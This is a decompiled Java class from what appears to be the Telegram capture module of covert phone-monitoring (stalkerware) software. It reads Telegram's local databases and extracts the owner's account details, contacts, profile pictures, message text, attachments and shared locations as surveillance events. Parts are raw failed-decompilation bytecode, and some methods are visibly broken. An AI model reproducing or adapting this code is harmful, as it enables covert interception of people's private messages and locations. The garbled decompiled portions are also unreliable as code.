                localObject4 = ((TLRPC.MessageMedia)localObject4).geo;
                d = ((TLRPC.GeoPoint)localObject4)._long;
                localObject1 = ((StringBuilder)localObject1).append(d);
                localObject1 = ((StringBuilder)localObject1).toString();
                ((com.vvt.im.events.info.c)localObject11).a((String)localObject1);
              }
            }
          }
        }
      }
    }
  }
  
  /* Error */
  public static ArrayList a(String paramString1, String paramString2, long paramLong1, long paramLong2, com.vvt.base.b paramb, String paramString3, RunningMode paramRunningMode)
  {
    // Byte code:
    //   0: getstatic 12	com/vvt/capture/telegram/removeFromPath:a	Z
    //   3: istore 9
    //   5: iload 9
    //   7: ifeq +3 -> 10
    //   10: getstatic 12	com/vvt/capture/telegram/removeFromPath:a	Z
    //   13: istore 9
    //   15: iload 9
    //   17: ifeq +3 -> 20
    //   20: new 281	java/util/ArrayList
    //   23: astore 10
    //   25: aload 10
    //   27: invokespecial 511	java/util/ArrayList:<init>	()V
    //   30: iconst_0
    //   31: istore 9
    //   33: aconst_null
    //   34: astore 11
    //   36: aconst_null
    //   37: astore 12
    //   39: iconst_2
    //   40: istore 13
    //   42: iconst_0
    //   43: istore 14
    //   45: aconst_null
    //   46: astore 15
    //   48: aload_1
    //   49: aload_0
    //   50: invokestatic 33	com/vvt/capture/telegram/internal/SQLite/SQLiteDatabase:getReadableDatabase	(Ljava/lang/String;Ljava/lang/String;)Lcom/vvt/capture/telegram/internal/SQLite/SQLiteDatabase;
    //   53: astore 11
    //   55: aload 11
    //   57: ifnull +397 -> 454
    //   60: getstatic 741	com/vvt/capture/telegram/MyUncaughtExceptionHandler:removeFromPath	Ljava/lang/String;
    //   63: astore 16
    //   65: iconst_2
    //   66: istore 17
    //   68: iload 17
    //   70: anewarray 154	java/lang/String
    //   73: astore 18
    //   75: iconst_0
    //   76: istore 19
    //   78: new 335	java/lang/StringBuilder
    //   81: astore 20
    //   83: aload 20
    //   85: invokespecial 336	java/lang/StringBuilder:<init>	()V
    //   88: aload 20
    //   90: lload_2
    //   91: invokevirtual 744	java/lang/StringBuilder:append	(J)Ljava/lang/StringBuilder;
    //   94: astore 20
    //   96: ldc_w 331
    //   99: astore 21
    //   101: aload 20
    //   103: aload 21
    //   105: invokevirtual 357	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   108: astore 20
    //   110: aload 20
    //   112: invokevirtual 366	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   115: astore 20
    //   117: aload 18
    //   119: iconst_0
    //   120: aload 20
    //   122: aastore
    //   123: iconst_1
    //   124: istore 19
    //   126: new 335	java/lang/StringBuilder
    //   129: astore 20
    //   131: aload 20
    //   133: invokespecial 336	java/lang/StringBuilder:<init>	()V
    //   136: aload 20
    //   138: lload 4
    //   140: invokevirtual 744	java/lang/StringBuilder:append	(J)Ljava/lang/StringBuilder;
    //   143: astore 20
    //   145: ldc_w 331
    //   148: astore 21
    //   150: aload 20
    //   152: aload 21
    //   154: invokevirtual 357	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   157: astore 20
    //   159: aload 20
    //   161: invokevirtual 366	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   164: astore 20
    //   166: aload 18
    //   168: iload 19
    //   170: aload 20
    //   172: aastore
    //   173: aload 16
    //   175: aload 18
    //   177: invokestatic 747	com/vvt/capture/telegram/removeFromPath:a	(Ljava/lang/String;[Ljava/lang/String;)Ljava/lang/String;
    //   180: astore 21
    //   182: iconst_0
    //   183: istore 22
    //   185: aconst_null
    //   186: astore 20
    //   188: iload 22
    //   190: iload 13
    //   192: if_icmpge +97 -> 289
    //   195: aload 12
    //   197: ifnonnull +92 -> 289
    //   200: iconst_0
    //   201: istore 14
    //   203: aconst_null
    //   204: astore 15
    //   206: iconst_0
    //   207: anewarray 4	java/lang/Object
    //   210: astore 15
    //   212: aload 11
    //   214: aload 21
    //   216: aload 15
    //   218: invokevirtual 49	com/vvt/capture/telegram/internal/SQLite/SQLiteDatabase:queryFinalized	(Ljava/lang/String;[Ljava/lang/Object;)Lcom/vvt/capture/telegram/internal/SQLite/SQLiteCursor;
    //   221: astore 12
    //   223: aload 12
    //   225: ifnull +47 -> 272
    //   228: aload_0
    //   229: astore 15
    //   231: aload 6
    //   233: astore 16
    //   235: aload 7
    //   237: astore 18
    //   239: aload 11
    //   241: aload_0
    //   242: aload 12
    //   244: aload 6
    //   246: aload 7
    //   248: aload 8
    //   250: invokestatic 750	com/vvt/capture/telegram/removeFromPath:a	(Lcom/vvt/capture/telegram/internal/SQLite/SQLiteDatabase;Ljava/lang/String;Lcom/vvt/capture/telegram/internal/SQLite/SQLiteCursor;Lcom/vvt/base/removeFromPath;Ljava/lang/String;Lcom/vvt/base/RunningMode;)Ljava/util/ArrayList;
    //   253: astore 15
    //   255: iload 22
    //   257: iconst_1
    //   258: iadd
    //   259: istore 23
    //   261: iload 23
    //   263: istore 22
    //   265: aload 15
    //   267: astore 10
    //   269: goto -81 -> 188
    //   272: ldc2_w 751
    //   275: lstore 24
    //   277: lload 24
    //   279: invokestatic 491	android/os/SystemClock:sleep	(J)V
    //   282: aload 10
    //   284: astore 15
    //   286: goto -31 -> 255
    //   289: aload 10
    //   291: astore 15
    //   293: aload 12
    //   295: ifnull +8 -> 303
    //   298: aload 12
    //   300: invokevirtual 63	com/vvt/capture/telegram/internal/SQLite/SQLiteCursor:dispose	()V
    //   303: aload 11
    //   305: ifnull +8 -> 313
    //   308: aload 11
    //   310: invokevirtual 66	com/vvt/capture/telegram/internal/SQLite/SQLiteDatabase:close	()V
    //   313: aload 15
    //   315: astore 11
    //   317: getstatic 12	com/vvt/capture/telegram/removeFromPath:a	Z
    //   320: istore 14
    //   322: iload 14
    //   324: ifeq +3 -> 327
    //   327: aload 11
    //   329: areturn
    //   330: astore 15
    //   332: iconst_0
    //   333: istore 14
    //   335: aconst_null
    //   336: astore 15
    //   338: aload 10
    //   340: astore 11
    //   342: getstatic 17	com/vvt/capture/telegram/removeFromPath:removeFromPath	Z
    //   345: istore 23
    //   347: iload 23
    //   349: ifeq +3 -> 352
    //   352: aload 12
    //   354: ifnull +8 -> 362
    //   357: aload 12
    //   359: invokevirtual 63	com/vvt/capture/telegram/internal/SQLite/SQLiteCursor:dispose	()V
    //   362: aload 15
    //   364: ifnull -47 -> 317
    //   367: aload 15
    //   369: invokevirtual 66	com/vvt/capture/telegram/internal/SQLite/SQLiteDatabase:close	()V
    //   372: goto -55 -> 317
    //   375: astore 26
    //   377: iconst_0
    //   378: istore 14
    //   380: aconst_null
    //   381: astore 15
    //   383: aload 26
    //   385: astore 11
    //   387: aload 12
    //   389: ifnull +8 -> 397
    //   392: aload 12
    //   394: invokevirtual 63	com/vvt/capture/telegram/internal/SQLite/SQLiteCursor:dispose	()V
    //   397: aload 15
    //   399: ifnull +8 -> 407
    //   402: aload 15
    //   404: invokevirtual 66	com/vvt/capture/telegram/internal/SQLite/SQLiteDatabase:close	()V
    //   407: aload 11
    //   409: athrow
    //   410: astore 26
    //   412: aload 11
    //   414: astore 15
    //   416: aload 26
    //   418: astore 11
    //   420: goto -33 -> 387
    //   423: astore 11
    //   425: goto -38 -> 387
    //   428: astore 15
    //   430: aload 11
    //   432: astore 15
    //   434: aload 10
    //   436: astore 11
    //   438: goto -96 -> 342
    //   441: astore 15
    //   443: aload 11
    //   445: astore 15
    //   447: aload 10
    //   449: astore 11
    //   451: goto -109 -> 342
    //   454: aload 10
    //   456: astore 15
    //   458: goto -165 -> 293
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	461	0	paramString1	String
    //   0	461	1	paramString2	String
    //   0	461	2	paramLong1	long
    //   0	461	4	paramLong2	long
    //   0	461	6	paramb	com.vvt.base.removeFromPath
    //   0	461	7	paramString3	String
    //   0	461	8	paramRunningMode	RunningMode
    //   3	29	9	bool1	boolean
    //   23	432	10	localObject1	Object
    //   34	385	11	localObject2	Object
    //   423	8	11	localObject3	Object
    //   436	14	11	localObject4	Object
    //   37	356	12	localSQLiteCursor	SQLiteCursor
    //   40	153	13	i	int
    //   43	336	14	bool2	boolean
    //   46	268	15	localObject5	Object
    //   330	1	15	localException1	Exception
    //   336	79	15	localObject6	Object
    //   428	1	15	localException2	Exception
    //   432	1	15	localObject7	Object
    //   441	1	15	localException3	Exception
    //   445	12	15	localObject8	Object
    //   63	171	16	localObject9	Object
    //   66	3	17	j	int
    //   73	165	18	localObject10	Object
    //   76	93	19	k	int
    //   81	106	20	localObject11	Object
    //   99	116	21	str	String
    //   183	81	22	m	int
    //   259	3	23	n	int
    //   345	3	23	bool3	boolean
    //   275	3	24	l	long
    //   375	9	26	localObject12	Object
    //   410	7	26	localObject13	Object
    // Exception table:
    //   from	to	target	type
    //   49	53	330	java/lang/Exception
    //   49	53	375	finally
    //   60	63	410	finally
    //   68	73	410	finally
    //   78	81	410	finally
    //   83	88	410	finally
    //   90	94	410	finally
    //   103	108	410	finally
    //   110	115	410	finally
    //   120	123	410	finally
    //   126	129	410	finally
    //   131	136	410	finally
    //   138	143	410	finally
    //   152	157	410	finally
    //   159	164	410	finally
    //   170	173	410	finally
    //   175	180	410	finally
    //   206	210	410	finally
    //   216	221	410	finally
    //   248	253	410	finally
    //   277	282	410	finally
    //   342	345	423	finally
    //   60	63	428	java/lang/Exception
    //   68	73	428	java/lang/Exception
    //   78	81	428	java/lang/Exception
    //   83	88	428	java/lang/Exception
    //   90	94	428	java/lang/Exception
    //   103	108	428	java/lang/Exception
    //   110	115	428	java/lang/Exception
    //   120	123	428	java/lang/Exception
    //   126	129	428	java/lang/Exception
    //   131	136	428	java/lang/Exception
    //   138	143	428	java/lang/Exception
    //   152	157	428	java/lang/Exception
    //   159	164	428	java/lang/Exception
    //   170	173	428	java/lang/Exception
    //   175	180	428	java/lang/Exception
    //   206	210	441	java/lang/Exception
    //   216	221	441	java/lang/Exception
    //   248	253	441	java/lang/Exception
    //   277	282	441	java/lang/Exception
  }
  
  public static List a(TelegramData paramTelegramData)
  {
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    Object localObject1 = new com/vvt/events/FxIMAccountEvent;
    ((FxIMAccountEvent)localObject1).<init>();
    long l1 = paramTelegramData.b();
    ((FxIMAccountEvent)localObject1).setEventTime(l1);
    int i = FxIMMessageServiceType.TELEGRAM.getValue();
    ((FxIMAccountEvent)localObject1).setImServiceId(i);
    Object localObject2 = paramTelegramData.f().a();
    ((FxIMAccountEvent)localObject1).setOwnerDisplayName((String)localObject2);
    localObject2 = paramTelegramData.f().b();
    ((FxIMAccountEvent)localObject1).setOwnerId((String)localObject2);
    localObject2 = paramTelegramData.f().c();
    ((FxIMAccountEvent)localObject1).setOwnerProfilePicture((byte[])localObject2);
    localObject2 = paramTelegramData.f().g();
    ((FxIMAccountEvent)localObject1).setOwnerProfilePicturePath((String)localObject2);
    localObject2 = paramTelegramData.f().d();
    ((FxIMAccountEvent)localObject1).setOwnerStatusMessage((String)localObject2);
    localArrayList.add(localObject1);
    localObject2 = new com/vvt/events/FxIMConversationEvent;
    ((FxIMConversationEvent)localObject2).<init>();
    localObject1 = paramTelegramData.i().a();
    ((FxIMConversationEvent)localObject2).setConversationId((String)localObject1);
    localObject1 = paramTelegramData.i().c();
    ((FxIMConversationEvent)localObject2).setConversationProfilePicture((byte[])localObject1);
    localObject1 = paramTelegramData.i().d();
    ((FxIMConversationEvent)localObject2).setConversationProfilePicturePath((String)localObject1);
    localObject1 = paramTelegramData.i().b();
    ((FxIMConversationEvent)localObject2).setConversationTitle((String)localObject1);
    localObject1 = paramTelegramData.i().e();
    ((FxIMConversationEvent)localObject2).setConversationStatusMessage((String)localObject1);
    l1 = paramTelegramData.b();
    ((FxIMConversationEvent)localObject2).setEventTime(l1);
    int j = FxIMMessageServiceType.TELEGRAM.getValue();
    ((FxIMConversationEvent)localObject2).setImServiceId(j);
    localObject1 = paramTelegramData.f().b();
    ((FxIMConversationEvent)localObject2).setOwnerId((String)localObject1);
    Object localObject3 = new java/util/HashSet;
    ((HashSet)localObject3).<init>();
    localObject1 = paramTelegramData.e();
    Object localObject4 = ((List)localObject1).iterator();
    boolean bool1;
    Object localObject6;
    for (;;)
    {
      bool1 = ((Iterator)localObject4).hasNext();
      if (!bool1) {
        break;
      }
      localObject1 = (com.vvt.im.events.info.e)((Iterator)localObject4).next();
      localObject5 = ((com.vvt.im.events.info.e)localObject1).d();
      localObject6 = paramTelegramData.f().b();
      boolean bool4 = ((String)localObject5).equalsIgnoreCase((String)localObject6);
      if (bool4)
      {
        bool1 = a;
        if (!bool1) {}
      }
      else
      {
        localObject1 = ((com.vvt.im.events.info.e)localObject1).d();
        ((HashSet)localObject3).add(localObject1);
      }
    }
    ((FxIMConversationEvent)localObject2).setParticipantContactIds((HashSet)localObject3);
    localArrayList.add(localObject2);
    localObject1 = paramTelegramData.e();
    localObject2 = ((List)localObject1).iterator();
    for (;;)
    {
      bool1 = ((Iterator)localObject2).hasNext();
      if (!bool1) {
        break;
      }
      localObject1 = (com.vvt.im.events.info.e)((Iterator)localObject2).next();
      localObject3 = ((com.vvt.im.events.info.e)localObject1).d();
      localObject4 = paramTelegramData.f().b();
      boolean bool5 = ((String)localObject3).equalsIgnoreCase((String)localObject4);
      if (bool5)
      {
        bool1 = a;
        if (!bool1) {}
      }
      else
      {
        localObject3 = new com/vvt/events/FxIMContactEvent;
        ((FxIMContactEvent)localObject3).<init>();
        localObject4 = ((com.vvt.im.events.info.e)localObject1).c();
        ((FxIMContactEvent)localObject3).setContactDisplayName((String)localObject4);
        localObject4 = ((com.vvt.im.events.info.e)localObject1).d();
        ((FxIMContactEvent)localObject3).setContactId((String)localObject4);
        localObject4 = ((com.vvt.im.events.info.e)localObject1).e();
        ((FxIMContactEvent)localObject3).setContactProfilePicture((byte[])localObject4);
        localObject4 = ((com.vvt.im.events.info.e)localObject1).a();
        ((FxIMContactEvent)localObject3).setContactProfilePicturePath((String)localObject4);
        localObject1 = ((com.vvt.im.events.info.e)localObject1).f();
        ((FxIMContactEvent)localObject3).setContactStatusMessage((String)localObject1);
        long l2 = paramTelegramData.b();
        ((FxIMContactEvent)localObject3).setEventTime(l2);
        int k = FxIMMessageServiceType.TELEGRAM.getValue();
        ((FxIMContactEvent)localObject3).setImServiceId(k);
        localObject1 = paramTelegramData.f().b();
        ((FxIMContactEvent)localObject3).setOwnerId((String)localObject1);
        localArrayList.add(localObject3);
      }
    }
    localObject3 = new com/vvt/events/FxIMMessageEvent;
    ((FxIMMessageEvent)localObject3).<init>();
    localObject4 = new java/util/ArrayList;
    ((ArrayList)localObject4).<init>();
    localObject1 = paramTelegramData.j();
    localObject2 = ((List)localObject1).iterator();
    for (;;)
    {
      bool2 = ((Iterator)localObject2).hasNext();
      if (!bool2) {
        break;
      }
      localObject1 = (com.vvt.im.events.info.a)((Iterator)localObject2).next();
      localObject5 = new com/vvt/events/d;
      ((com.vvt.events.d)localObject5).<init>();
      localObject6 = ((com.vvt.im.events.info.a)localObject1).e();
      ((com.vvt.events.d)localObject5).b((byte[])localObject6);
      localObject6 = ((com.vvt.im.events.info.a)localObject1).a();
      ((com.vvt.events.d)localObject5).a((String)localObject6);
      localObject6 = ((com.vvt.im.events.info.a)localObject1).c();
      ((com.vvt.events.d)localObject5).b((String)localObject6);
      localObject6 = ((com.vvt.im.events.info.a)localObject1).b();
      ((com.vvt.events.d)localObject5).c((String)localObject6);
      localObject6 = ((com.vvt.im.events.info.a)localObject1).f();
      ((com.vvt.events.d)localObject5).d((String)localObject6);
      localObject1 = ((com.vvt.im.events.info.a)localObject1).d();
      ((com.vvt.events.d)localObject5).a((byte[])localObject1);
      ((List)localObject4).add(localObject5);
    }
    boolean bool2 = false;
    localObject1 = null;
    i = paramTelegramData.a();
    int n = MessageType.ShareLocation.getNumber();
    i &= n;
    Object localObject5 = MessageType.ShareLocation;
    n = ((MessageType)localObject5).getNumber();
    if (i == n)
    {
      localObject1 = new com/vvt/events/e;
      ((com.vvt.events.e)localObject1).<init>();
      float f = paramTelegramData.g().d();
      ((com.vvt.events.e)localObject1).a(f);
      double d = paramTelegramData.g().a();
      ((com.vvt.events.e)localObject1).a(d);
      d = paramTelegramData.g().b();
      ((com.vvt.events.e)localObject1).b(d);
      localObject2 = paramTelegramData.g().c();
      ((com.vvt.events.e)localObject1).a((String)localObject2);
    }
    localObject2 = paramTelegramData.i().a();
    ((FxIMMessageEvent)localObject3).setConversationId((String)localObject2);
    localObject2 = paramTelegramData.d();
    localObject5 = TelegramData.Direction.IN;
    if (localObject2 == localObject5) {}
    for (localObject2 = FxEventDirection.IN;; localObject2 = FxEventDirection.OUT)
    {
      ((FxIMMessageEvent)localObject3).setDirection((FxEventDirection)localObject2);
      long l3 = paramTelegramData.b();
      ((FxIMMessageEvent)localObject3).setEventTime(l3);
      i = FxIMMessageServiceType.TELEGRAM.getValue();
      ((FxIMMessageEvent)localObject3).setImServiceId(i);
      localObject2 = paramTelegramData.c();
      ((FxIMMessageEvent)localObject3).setMessage((String)localObject2);
      localObject2 = new com/vvt/events/e;
      ((com.vvt.events.e)localObject2).<init>();
      ((FxIMMessageEvent)localObject3).setMessageLocation((com.vvt.events.e)localObject2);
      ((FxIMMessageEvent)localObject3).setShareLocation((com.vvt.events.e)localObject1);
      int m = paramTelegramData.a();
      ((FxIMMessageEvent)localObject3).setTextRepresentation(m);
      localObject1 = paramTelegramData.d();
      localObject2 = TelegramData.Direction.IN;
      if (localObject1 == localObject2)
      {
        localObject1 = paramTelegramData.h().a();
        ((FxIMMessageEvent)localObject3).setSenderId((String)localObject1);
      }
      localObject2 = ((List)localObject4).iterator();
      for (;;)
      {
        boolean bool3 = ((Iterator)localObject2).hasNext();
        if (!bool3) {
          break;
        }
        localObject1 = (com.vvt.events.d)((Iterator)localObject2).next();
        ((FxIMMessageEvent)localObject3).addAttachment((com.vvt.events.d)localObject1);
      }
    }
    localArrayList.add(localObject3);
    return localArrayList;
  }
  
  private static boolean a(int paramInt, com.vvt.base.b paramb, long paramLong)
  {
    int i = 1;
    float f = Float.MIN_VALUE;
    boolean bool4 = false;
    long l1 = 0L;
    boolean bool5 = paramLong < l1;
    if (!bool5) {}
    boolean bool3;
    for (bool5 = false;; bool5 = bool3)
    {
      long l2;
      if (paramInt == i)
      {
        l2 = paramb.b();
        boolean bool1 = paramLong < l2;
        if (bool1) {
          bool5 = false;
        }
      }
      int j = 2;
      f = 2.8E-45F;
      if (paramInt == j)
      {
        l2 = paramb.d();
        boolean bool2 = paramLong < l2;
        if (!bool2) {
          break label126;
        }
      }
      for (;;)
      {
        bool5 = a;
        if (bool5) {}
        return bool4;
        int k = 3;
        f = 4.2E-45F;
        if (paramInt == k)
        {
          l2 = paramb.c();
          bool3 = paramLong < l2;
          if (bool3) {}
        }
        else
        {
          label126:
          do
          {
            bool4 = bool5;
            break;
            l2 = paramb.e();
            bool3 = paramLong < l2;
          } while (!bool3);
        }
      }
    }
  }
  
  public static long b(String paramString)
  {
    boolean bool1 = a;
    if (bool1) {}
    bool1 = false;
    long l = a(null, paramString);
    boolean bool2 = a;
    if (bool2) {}
    bool2 = a;
    if (bool2) {}
    return l;
  }
  
  private static com.vvt.im.events.info.d b(String paramString1, String paramString2, String paramString3)
  {
    boolean bool1 = a;
    if (bool1) {}
    com.vvt.im.events.info.d locald = new com/vvt/im/events/info/d;
    locald.<init>();
    try
    {
      Object localObject = new java/io/File;
      ((File)localObject).<init>(paramString2);
      localObject = a((File)localObject);
      if (localObject != null)
      {
        int i = ((TLRPC.User)localObject).id;
        if (i != 0)
        {
          i = ((TLRPC.User)localObject).id;
          str = String.valueOf(i);
          locald.b(str);
        }
        String str = ((TLRPC.User)localObject).first_name;
        if (str != null)
        {
          str = ((TLRPC.User)localObject).first_name;
          locald.a(str);
        }
        localObject = a((TLRPC.User)localObject, paramString1, paramString3);
        if (localObject != null) {
          locald.f((String)localObject);
        }
        bool2 = a;
        if (!bool2) {}
      }
    }
    catch (Exception localException)
    {
      for (;;)
      {
        boolean bool2 = b;
        if (!bool2) {}
      }
    }
    bool2 = a;
    if (bool2) {}
    return locald;
  }
  
  private static ArrayList b(SQLiteDatabase paramSQLiteDatabase, String paramString1, String paramString2, String paramString3)
  {
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    try
    {
      com.vvt.im.events.info.e locale = a(paramSQLiteDatabase, paramString1, paramString2, paramString3);
      if (locale != null) {
        localArrayList.add(locale);
      }
      if (0 == 0) {
        break label40;
      }
    }
    catch (Exception localException)
    {
      for (;;)
      {
        label40:
        boolean bool = b;
        if ((bool) && (0 == 0)) {}
      }
    }
    finally
    {
      if (0 == 0) {
        break label72;
      }
      null.dispose();
    }
    null.dispose();
    return localArrayList;
  }
  
  private static boolean c(String paramString)
  {
    boolean bool1 = false;
    int i = 2;
    try
    {
      byte[] arrayOfByte = new byte[i];
      byte[] tmp9_8 = arrayOfByte;
      tmp9_8[0] = 63;
      tmp9_8[1] = 63;
      Object localObject = "US-ASCII";
      localObject = paramString.getBytes((String)localObject);
      bool1 = Arrays.equals((byte[])localObject, arrayOfByte);
      bool2 = a;
      if (!bool2) {}
    }
    catch (UnsupportedEncodingException localUnsupportedEncodingException)
    {
      for (;;)
      {
        boolean bool2 = b;
        if (!bool2) {}
      }
    }
    return bool1;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/telegram/removeFromPath.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */